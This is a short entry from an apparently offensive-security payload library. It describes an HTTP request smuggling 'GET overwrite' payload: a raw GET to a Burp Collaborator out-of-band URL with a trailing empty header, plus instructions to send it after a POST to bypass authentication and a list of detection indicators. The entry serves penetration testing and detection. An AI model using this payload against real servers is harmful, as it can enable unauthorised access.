---
type: code
language: http
verified: true
platforms:
  - web
tags:
  - http-smuggling
  - payload
  - web-exploitation
validated: true
---

# HTTP Smuggling GET Overwrite Request

## Code

```http
GET http://something.burpcollaborator.net  HTTP/1.1
X: 
```

## Description

This HTTP request payload is used to test method overwriting in an HTTP Request Smuggling attack. It injects a GET request after a POST, exploiting parsing differences to smuggle the request to the back-end server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| something.burpcollaborator.net | Collaborator or OOB URL for verification | $_COLLABORATOR_URL |

## Usage

Send this payload immediately after a legitimate POST request using a tool like Burp Repeater, curl with --http1.1, or netcat. It helps confirm if the front-end ignores the subsequent GET while the back-end processes it, potentially bypassing authentication.

## Detection

- Log analysis for malformed requests with trailing empty headers (X: ).
- WAF alerts on method mismatches or unexpected OOB DNS queries.
- Proxy logs showing desynchronized request streams.

## Related

- [[procedures/http-request-smuggling-detection-and-exploitation]]
- [[tools/smuggler]]
